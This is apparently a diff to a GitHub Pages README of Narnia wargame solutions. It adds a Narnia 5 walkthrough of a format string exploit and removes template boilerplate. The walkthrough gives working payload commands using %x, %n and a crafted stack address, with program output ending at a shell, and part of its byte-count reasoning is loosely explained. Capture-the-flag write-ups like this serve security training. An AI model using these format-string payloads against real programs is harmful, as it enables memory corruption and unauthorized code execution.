@@ -111,24 +111,39 @@ I don't think there is something special in these excercises. There are great wr
 Side note: narnia4 uses a nope slide, which is an important technique to master.
 
 
+## Narnia 5
 
-- Bulleted
-- List
+Here we are exploiting format string vulnerability. One should get familier with the %x, %n and %s format string. Usually, the most common vulnerable function for format string are: 
+printf
+vsprintf
+fprintf
+vsnprf
+sprint
+vfprintf
+snprintf
+vprintf
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+What happens basically is as following: '%x,%s,%n' are special format string input. When we put them into a function such as above, the function expects an argument corresponding to them. If we put more format string input than actuall corresponding arguments, the function will start pulling addresses from the stack with the "%x" format string. This is great for us, as we can determine how much addresses we need to pop (each address is 4 bytes big) and then write their length into a address crafted by us. Meet the "%n" format string, which takes an address and write number of byes into it. This is exactly what we are going to do - determine what is the address and then craft 500 bytes into I's address.
+First, we want to pop out our input from the stack. We will do it by trying to print our input. For me, it takes 5 format strings:
 ```
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print('aaaa')"`%x%x%x%x%x
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [aaaac287ffffffff2ff7e23dc861616161] (34)
+i = 1 (0xffffd62c)
+```
+As seen above, 61616161 ('aaaa') is popped in the end, it means that we need 5 format strings in order to pop our input. Let's change it to I's address:
+```
+`python -c "print('\x2c\xd6\xff\xff')"`%x%x%x%x%x
+```
+and now we want to write 500 bytes, so we need to replace the last %x with %n and add additional width:
+```
+`python -c "print('\x2c\xd6\xff\xff')"`%x%x%x%482u%n
+```
+Why 482? because %x takes 4 bytes and %n 2 bytes, tehrefore 482+(4 * 4)+2=500.
+```
+narnia5@narnia:/narnia$ ./narnia5 `python -c "print('\x2c\xd6\xff\xff')"`%x%x%x%482u%n
+Change i's value from 1 -> 500. GOOD
+$ ^C
+```
+here we go.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/int3rsys/Narnia-solutions/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
